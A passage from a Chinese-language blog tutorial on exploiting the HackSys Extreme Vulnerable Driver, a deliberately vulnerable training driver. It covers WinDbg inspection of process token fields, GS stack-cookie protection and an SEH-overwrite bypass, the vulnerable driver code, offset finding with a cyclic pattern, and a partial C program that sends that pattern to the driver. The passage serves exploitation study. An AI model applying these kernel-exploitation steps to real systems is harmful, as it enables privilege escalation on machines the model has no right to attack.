    ElapsedTime                       01:06:20.6</code></pre><ol start="2">
<li>通过<code>EPROCESS</code>偏移查看</li>
</ol>
<div class="highlight" id="id-27"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="n">kd</span><span class="o">&gt;</span> <span class="n">dt</span> <span class="n">nt</span><span class="o">!</span><span class="n">_EX_FAST_REF</span> <span class="mi">8664</span><span class="n">ba58</span><span class="o">+</span><span class="mh">0xf8</span>
</span></span><span class="line"><span class="cl">   <span class="o">+</span><span class="mh">0x000</span> <span class="nl">Object</span>           <span class="p">:</span> <span class="mh">0x898fcc7e</span> <span class="n">Void</span>
</span></span><span class="line"><span class="cl">   <span class="o">+</span><span class="mh">0x000</span> <span class="nl">RefCnt</span>           <span class="p">:</span> <span class="mi">0</span><span class="n">y110</span>
</span></span><span class="line"><span class="cl">   <span class="o">+</span><span class="mh">0x000</span> <span class="nl">Value</span>            <span class="p">:</span> <span class="mh">0x898fcc7e</span></span></span></code></pre></div><ol start="3">
<li>直接查看内存数据</li>
</ol>
<div class="highlight" id="id-28"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="n">kd</span><span class="o">&gt;</span> <span class="n">dd</span> <span class="mh">0x8664ba58</span><span class="o">+</span><span class="mh">0xF8</span>
</span></span><span class="line"><span class="cl"><span class="nl">ReadVirtual</span><span class="p">:</span> <span class="mi">8664</span><span class="n">bb50</span> <span class="n">not</span> <span class="n">properly</span> <span class="n">sign</span> <span class="n">extended</span>
</span></span><span class="line"><span class="cl"><span class="mi">8664</span><span class="n">bb50</span>  <span class="mf">898f</span><span class="n">cc7e</span> <span class="mo">0001</span><span class="n">c924</span> <span class="mo">00000000</span> <span class="mo">00000000</span>
</span></span><span class="line"><span class="cl"><span class="mi">8664</span><span class="n">bb60</span>  <span class="mo">00000000</span> <span class="mo">00000000</span> <span class="mo">00000000</span> <span class="mo">00000000</span>
</span></span><span class="line"><span class="cl"><span class="mi">8664</span><span class="n">bb70</span>  <span class="mo">000001</span><span class="n">d4</span> <span class="mo">00000000</span> <span class="n">fe939bd0</span> <span class="mo">00000000</span>
</span></span><span class="line"><span class="cl"><span class="mi">8664</span><span class="n">bb80</span>  <span class="mi">9</span><span class="n">c6690c0</span> <span class="mo">000</span><span class="n">d0000</span> <span class="mf">273f0e8</span><span class="n">d</span> <span class="mo">00000000</span>
</span></span><span class="line"><span class="cl"><span class="mi">8664</span><span class="n">bb90</span>  <span class="mo">00000000</span> <span class="mo">000000</span><span class="mi">88</span> <span class="mf">000001f</span><span class="n">c</span> <span class="mo">00000000</span>
</span></span><span class="line"><span class="cl"><span class="mi">8664</span><span class="n">bba0</span>  <span class="mo">00000000</span> <span class="mo">00000000</span> <span class="mi">89006880</span> <span class="mi">85</span><span class="n">b29890</span>
</span></span><span class="line"><span class="cl"><span class="mi">8664</span><span class="n">bbb0</span>  <span class="mf">7ff</span><span class="n">d8000</span> <span class="mo">00000000</span> <span class="mo">00000000</span> <span class="mo">00000000</span>
</span></span><span class="line"><span class="cl"><span class="mi">8664</span><span class="n">bbc0</span>  <span class="mi">8</span><span class="n">d5f1000</span> <span class="mi">68637673</span> <span class="mf">2e74736</span><span class="n">f</span> <span class="mo">00657</span><span class="mi">865</span></span></span></code></pre></div><p>可以看到1和2,3是不一样的：</p>
<blockquote>
<p>!process命令会自动应用掩码，并从显示信息中过滤引用计数；我们可以通过使用最右3比特置零的掩码，在如下表达式求值的帮助下，人工实现相同的功能：</p>
<p><code>?[token] &amp; 0xFFFFFFF8</code></p>
</blockquote>
<p>如下即可生成应用掩码后的Token</p>
<div class="highlight" id="id-29"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="n">kd</span><span class="o">&gt;</span> <span class="o">?</span><span class="p">[</span><span class="mf">898f</span><span class="n">cc7e</span><span class="p">]</span> <span class="o">&amp;</span> <span class="mh">0xFFFFFFF8</span>
</span></span><span class="line"><span class="cl"><span class="n">Evaluate</span> <span class="nl">expression</span><span class="p">:</span> <span class="o">-</span><span class="mi">1987064712</span> <span class="o">=</span> <span class="mf">898f</span><span class="n">cc78</span></span></span></code></pre></div><p>但是需要的是没有掩码前的<code>token</code></p>
<p>调用到<code>EPROCESS</code>结构体的流程：</p>
<pre tabindex="0"><code>KPCR（PrcbData）:PrcbData是 _KPRCB结构，PrcbData=KPCR+0x120
=&gt;
KPRCB（CurrentThread）:CurrentThread是_KTHREAD结构,CurrentThread=KPRCB+0x4
=&gt;
KTHREAD（ApcState）:ApcState是_KAPC_STATE结构,ApcState=KTHREAD+0x40
=&gt;
KAPC_STATE（Process）:Process是_KPROCESS结构,Process=KAPC_STATE+0x10
=&gt;
KPROCESS</code></pre><p><code>EPROCESS</code>结构体偏移<code>0x0b8</code>表示所有进程的双向链表，双向链表<code>LIST_ENTRY</code>将所有正在运行的进程链接到一条关系线上：</p>
<div class="highlight" id="id-31"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="n">copy</span>
</span></span><span class="line"><span class="cl"><span class="c1">//0x8 bytes (sizeof)
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">struct</span> <span class="n">LIST_ENTRY32</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">ULONG</span> <span class="n">Flink</span><span class="p">;</span>  <span class="c1">//0x0
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="n">ULONG</span> <span class="n">Blink</span><span class="p">;</span>  <span class="c1">//0x4
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="p">};</span> 
</span></span></code></pre></div><p>修复方案：</p>
<p>将<code>size</code>设置为<code>sizeof(KernelBuffer)</code>即可</p>
<div class="highlight" id="id-32"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="nf">RtlCopyMemory</span><span class="p">((</span><span class="n">PVOID</span><span class="p">)</span><span class="n">KernelBuffer</span><span class="p">,</span> <span class="n">UserBuffer</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">KernelBuffer</span><span class="p">));</span></span></span></code></pre></div><h2 id="3stackoverflowgs-triggerbufferoverflowstackgs" class="heading-element">
  <a href="#3stackoverflowgs-triggerbufferoverflowstackgs" class="heading-mark"></a>3.StackOverflowGS-TriggerBufferOverflowStackGS</h2><p><a href="https://klue.github.io/blog/2017/09/hevd_stack_gs/?msclkid=9bb65ef4cf4a11ec8dd20f19f6cc758c"target="_blank" rel="external nofollow noopener noreferrer">https://klue.github.io/blog/2017/09/hevd_stack_gs/?msclkid=9bb65ef4cf4a11ec8dd20f19f6cc758c</a></p>
<p>这个是有GS保护的栈溢出</p>
<p>GS编译选项为每个函数调用增加了一些额外的数据和操作，用以检测栈中的溢出。
在所有函数调用发生时，向栈帧内压入一个额外的随机 DWORD，随机数标注为“SecurityCookie”。
Security Cookie位于EBP之前,系统还将在.data的内存区域中存放一个Security Cookie的副本</p>
<p><img loading="lazy" src="/posts/2023-8-hevd/921642_VWY7SJUQNVAH4NM.jpg" alt="img" srcset="/posts/2023-8-hevd/921642_VWY7SJUQNVAH4NM.jpg?size=small, /posts/2023-8-hevd/921642_VWY7SJUQNVAH4NM.jpg?size=medium 1.5x, /posts/2023-8-hevd/921642_VWY7SJUQNVAH4NM.jpg?size=large 2x" data-title="img" style="--width: 660px;--aspect-ratio: 660 / 421;background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
<p>在函数返回之前，系统将执行一个额外的安全验证操作，被称做 Security check。在Security Check的过程中，系统将比较栈帧中原先存放的Security Co okie和.data中副本的值，如果两者不吻合，说明栈帧中的Security Cookie已被破坏，即栈中发生了溢出。当检测到栈中发生溢出时，系统将进入异常处理流程，函数不会被正常返回，ret 指令也不会被执行</p>
<p><img loading="lazy" src="/posts/2023-8-hevd/921642_JJ8NJG4HUJGPWGT.jpg" alt="img" srcset="/posts/2023-8-hevd/921642_JJ8NJG4HUJGPWGT.jpg?size=small, /posts/2023-8-hevd/921642_JJ8NJG4HUJGPWGT.jpg?size=medium 1.5x, /posts/2023-8-hevd/921642_JJ8NJG4HUJGPWGT.jpg?size=large 2x" data-title="img" style="--width: 854px;--aspect-ratio: 854 / 574;background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
<blockquote>
<p>但是额外的数据和操作带来的直接后果就是系统性能的下降，为了将对性能的影响降到最小，编译器在编译程序的时候并不是对所有的函数都应用GS，以下情况不会应用GS。
(1）函数不包含缓冲区。
(2）函数被定义为具有变量参数列表。
(3）函数使用无保护的关键字标记。
(4）函数在第一个语句中包含内嵌汇编代码。
(5）缓冲区不是8字节类型且大小不大于4个字节。</p>
</blockquote>
<p>除了在返回地址前添加Security Cookie外，在Visual Studio 2005及后续版本还使用了变量重排技术，在编译时根据局部变量的类型对变量在栈帧中的位置进行调整，将字符串变量移动到栈帧的高地址。这样可以防止该字符串溢出时破坏其他的局部变量。同时还会将指针参数和字符串参数复制到内存中低地址，防止函数参数被破坏</p>
<p><img loading="lazy" src="/posts/2023-8-hevd/921642_ATQJ5SPZCEC3DYX.jpg" alt="img" srcset="/posts/2023-8-hevd/921642_ATQJ5SPZCEC3DYX.jpg?size=small, /posts/2023-8-hevd/921642_ATQJ5SPZCEC3DYX.jpg?size=medium 1.5x, /posts/2023-8-hevd/921642_ATQJ5SPZCEC3DYX.jpg?size=large 2x" data-title="img" style="--width: 899px;--aspect-ratio: 899 / 402;background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
<p>GS机制并没有对S.E.H 提供保护，可以通过攻击程序的异常处理达到绕过GS 的目的</p>
<p>异常处理函数：</p>
<div class="highlight" id="id-33"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="n">EXCEPTION_DISPOSITION</span>
</span></span><span class="line"><span class="cl"><span class="kr">__cdecl</span> <span class="nf">_except_handler</span><span class="p">(</span> <span class="k">struct</span> <span class="n">_EXCEPTION_RECORD</span> <span class="o">*</span><span class="n">ExceptionRecord</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                        <span class="kt">void</span> <span class="o">*</span> <span class="n">EstablisherFrame</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                        <span class="k">struct</span> <span class="n">_CONTEXT</span> <span class="o">*</span><span class="n">ContextRecord</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                        <span class="kt">void</span> <span class="o">*</span> <span class="n">DispatcherContext</span><span class="p">);</span></span></span></code></pre></div><p>Visual C++为使用结构化异常处理的函数生成的标准异常堆栈帧：</p>
<div class="highlight" id="id-34"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="n">H</span>
</span></span><span class="line"><span class="cl"><span class="n">EBP</span><span class="o">-</span><span class="mo">00</span> <span class="n">_ebp</span>
</span></span><span class="line"><span class="cl"><span class="n">EBP</span><span class="o">-</span><span class="mo">04</span> <span class="n">trylevel</span>
</span></span><span class="line"><span class="cl"><span class="n">EBP</span><span class="o">-</span><span class="mi">08</span> <span class="n">scopetable数组指针</span>
</span></span><span class="line"><span class="cl"><span class="n">EBP</span><span class="o">-</span><span class="mi">0</span><span class="n">C</span> <span class="n">handler函数地址</span>
</span></span><span class="line"><span class="cl"><span class="n">EBP</span><span class="o">-</span><span class="mi">10</span><span class="err">指向前一个</span><span class="n">EXCEPTION_REGISTRATION结构</span>
</span></span><span class="line"><span class="cl"><span class="n">EBP</span><span class="o">-</span><span class="mi">14</span> <span class="n">GetExceptionInformation</span>
</span></span><span class="line"><span class="cl"><span class="n">EBP</span><span class="o">-</span><span class="mi">18</span> <span class="err">栈帧中的标准</span><span class="n">ESP</span>
</span></span><span class="line"><span class="cl"><span class="n">L</span></span></span></code></pre></div><h3 id="漏洞点分析" class="heading-element">
  <a href="#%e6%bc%8f%e6%b4%9e%e7%82%b9%e5%88%86%e6%9e%90" class="heading-mark"></a>漏洞点分析</h3><div class="highlight" id="id-35"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">lm  查看所有已加载模块
</span></span><span class="line"><span class="cl">lm m H* 设置过滤，查找HEVD模块
</span></span><span class="line"><span class="cl">lm m HEVD</span></span></code></pre></div><p>对于BufferOverflowStackGS，不攻击返回地址，而攻击SEH，覆盖SEH handle ，人为构造异常，触发异常，执行异常处理函数.</p>
<div class="highlight" id="id-36"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cp">##define BUFFER_SIZE 512  
</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
</span></span><span class="line"><span class="cl"><span class="n">NTSTATUS</span>
</span></span><span class="line"><span class="cl"><span class="nf">TriggerBufferOverflowStackGS</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">    <span class="n">_In_</span> <span class="n">PVOID</span> <span class="n">UserBuffer</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="n">_In_</span> <span class="n">SIZE_T</span> <span class="n">Size</span>
</span></span><span class="line"><span class="cl"><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">NTSTATUS</span> <span class="n">Status</span> <span class="o">=</span> <span class="n">STATUS_SUCCESS</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">UCHAR</span> <span class="n">KernelBuffer</span><span class="p">[</span><span class="n">BUFFER_SIZE</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span> <span class="mi">0</span> <span class="p">};</span>
</span></span><span class="line"><span class="cl">    <span class="nf">PAGED_CODE</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    <span class="kr">__try</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nf">ProbeForRead</span><span class="p">(</span><span class="n">UserBuffer</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">KernelBuffer</span><span class="p">),</span> <span class="p">(</span><span class="n">ULONG</span><span class="p">)</span><span class="nf">__alignof</span><span class="p">(</span><span class="n">UCHAR</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">        <span class="nf">DbgPrint</span><span class="p">(</span><span class="s">&#34;[+] UserBuffer: 0x%p</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">UserBuffer</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nf">DbgPrint</span><span class="p">(</span><span class="s">&#34;[+] UserBuffer Size: 0x%X</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">Size</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nf">DbgPrint</span><span class="p">(</span><span class="s">&#34;[+] KernelBuffer: 0x%p</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">KernelBuffer</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nf">DbgPrint</span><span class="p">(</span><span class="s">&#34;[+] KernelBuffer Size: 0x%X</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">KernelBuffer</span><span class="p">));</span>
</span></span><span class="line"><span class="cl"><span class="cp">##ifdef SECURE
</span></span></span><span class="line"><span class="cl"><span class="cp"></span>        <span class="nf">RtlCopyMemory</span><span class="p">((</span><span class="n">PVOID</span><span class="p">)</span><span class="n">KernelBuffer</span><span class="p">,</span> <span class="n">UserBuffer</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">KernelBuffer</span><span class="p">));</span><span class="c1">//安全版本
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="cp">##else
</span></span></span><span class="line"><span class="cl"><span class="cp"></span>        <span class="nf">DbgPrint</span><span class="p">(</span><span class="s">&#34;[+] Triggering Buffer Overflow in Stack (GS)</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nf">RtlCopyMemory</span><span class="p">((</span><span class="n">PVOID</span><span class="p">)</span><span class="n">KernelBuffer</span><span class="p">,</span> <span class="n">UserBuffer</span><span class="p">,</span> <span class="n">Size</span><span class="p">);</span><span class="c1">//不安全版本，未对size做限制
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="cp">##endif
</span></span></span><span class="line"><span class="cl"><span class="cp"></span>    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="kr">__except</span> <span class="p">(</span><span class="n">EXCEPTION_EXECUTE_HANDLER</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">Status</span> <span class="o">=</span> <span class="nf">GetExceptionCode</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">        <span class="nf">DbgPrint</span><span class="p">(</span><span class="s">&#34;[-] Exception Code: 0x%X</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">Status</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">Status</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></div><p>ebp与sehandler偏移为0xC，确定下KernelBuffer的地址，然后ebp-0xC-KernelBuffer就可以确定偏移了</p>
<div class="highlight" id="id-37"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="n">kd</span><span class="o">&gt;</span> <span class="n">bp</span> <span class="n">HEVD</span><span class="o">!</span><span class="n">TriggerBufferOverflowStackGS</span>
</span></span><span class="line"><span class="cl"><span class="n">kd</span><span class="o">&gt;</span> <span class="n">g</span>
</span></span><span class="line"><span class="cl"><span class="n">Breakpoint</span> <span class="mi">0</span> <span class="n">hit</span>
</span></span><span class="line"><span class="cl"><span class="n">HEVD</span><span class="o">!</span><span class="nl">TriggerBufferOverflowStackGS</span><span class="p">:</span>
</span></span><span class="line"><span class="cl"><span class="n">ac51a2a6</span> <span class="mi">6810020000</span>      <span class="n">push</span>    <span class="mi">210</span><span class="n">h</span>
</span></span><span class="line"><span class="cl"><span class="n">kd</span><span class="o">&gt;</span> <span class="n">r</span>
</span></span><span class="line"><span class="cl"><span class="n">eax</span><span class="o">=</span><span class="mo">0000020</span><span class="n">e</span> <span class="n">ebx</span><span class="o">=</span><span class="mi">878</span><span class="n">bb7f0</span> <span class="n">ecx</span><span class="o">=</span><span class="n">c0000001</span> <span class="n">edx</span><span class="o">=</span><span class="mo">003</span><span class="n">d3bd0</span> <span class="n">esi</span><span class="o">=</span><span class="mf">83f</span><span class="mi">1817</span><span class="n">c</span> <span class="n">edi</span><span class="o">=</span><span class="mi">878</span><span class="n">bb780</span>
</span></span><span class="line"><span class="cl"><span class="n">eip</span><span class="o">=</span><span class="n">ac51a2a6</span> <span class="n">esp</span><span class="o">=</span><span class="mi">8</span><span class="n">b47fab4</span> <span class="n">ebp</span><span class="o">=</span><span class="mi">8</span><span class="n">b47fac0</span> <span class="n">iopl</span><span class="o">=</span><span class="mi">0</span>         <span class="n">nv</span> <span class="n">up</span> <span class="n">ei</span> <span class="n">pl</span> <span class="n">nz</span> <span class="n">na</span> <span class="n">po</span> <span class="n">nc</span>
</span></span><span class="line"><span class="cl"><span class="n">cs</span><span class="o">=</span><span class="mo">000</span><span class="mi">8</span>  <span class="n">ss</span><span class="o">=</span><span class="mo">0010</span>  <span class="n">ds</span><span class="o">=</span><span class="mo">0023</span>  <span class="n">es</span><span class="o">=</span><span class="mo">0023</span>  <span class="n">fs</span><span class="o">=</span><span class="mo">0030</span>  <span class="n">gs</span><span class="o">=</span><span class="mo">0000</span>             <span class="n">efl</span><span class="o">=</span><span class="mo">00000202</span>
</span></span><span class="line"><span class="cl"><span class="n">HEVD</span><span class="o">!</span><span class="nl">TriggerBufferOverflowStackGS</span><span class="p">:</span>
</span></span><span class="line"><span class="cl"><span class="n">ac51a2a6</span> <span class="mi">6810020000</span>      <span class="n">push</span>    <span class="mi">210</span><span class="n">h</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl"><span class="mi">8</span><span class="n">b47f894</span>
</span></span><span class="line"><span class="cl">    <span class="mi">8</span><span class="n">b47fab0</span></span></span></code></pre></div><h3 id="确定偏移" class="heading-element">
  <a href="#%e7%a1%ae%e5%ae%9a%e5%81%8f%e7%a7%bb" class="heading-mark"></a>确定偏移</h3><p>这里有两种方法：</p>
<ul>
<li>随机字符串</li>
</ul>
<p>生成一段随机字符串：</p>
<div class="highlight" id="id-38"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">$ ./pattern_create.rb -l <span class="m">1000</span>
</span></span><span class="line"><span class="cl">Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2B</span></span></code></pre></div><p>测试程序：</p>
<div class="highlight" id="id-39"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cp">##include &lt;iostream&gt;
</span></span></span><span class="line"><span class="cl"><span class="cp">##include &lt;Windows.h&gt;
</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
</span></span><span class="line"><span class="cl"><span class="kt">char</span> <span class="o">*</span><span class="n">shellcode</span> <span class="o">=</span> <span class="s">&#34;Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2B&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="n">shellcodeLength</span> <span class="o">=</span> <span class="nf">strlen</span><span class="p">(</span><span class="n">shellcode</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">HANDLE</span> <span class="n">hDevice</span> <span class="o">=</span> <span class="o">::</span><span class="nf">CreateFileW</span><span class="p">(</span><span class="sa">L</span><span class="s">&#34;</span><span class="se">\\\\</span><span class="s">.</span><span class="se">\\</span><span class="s">HacksysExtremeVulnerableDriver&#34;</span><span class="p">,</span> <span class="n">GENERIC_ALL</span><span class="p">,</span> <span class="n">FILE_SHARE_WRITE</span><span class="p">,</span> <span class="n">nullptr</span><span class="p">,</span> <span class="n">OPEN_EXISTING</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">nullptr</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">hDevice</span> <span class="o">==</span> <span class="n">INVALID_HANDLE_VALUE</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;[ERROR]Open Device Error</span><span class="se">\r\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nf">system</span><span class="p">(</span><span class="s">&#34;pause&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nf">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;[INFO]Device Handle: 0x%X</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">hDevice</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="n">ULONG</span> <span class="n">WriteRet</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="nf">DeviceIoControl</span><span class="p">(</span><span class="n">hDevice</span><span class="p">,</span> <span class="mh">0x222007</span><span class="p">,</span> <span class="p">(</span><span class="n">LPVOID</span><span class="p">)</span><span class="n">shellcode</span><span class="p">,</span> <span class="n">shellcodeLength</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">WriteRet</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
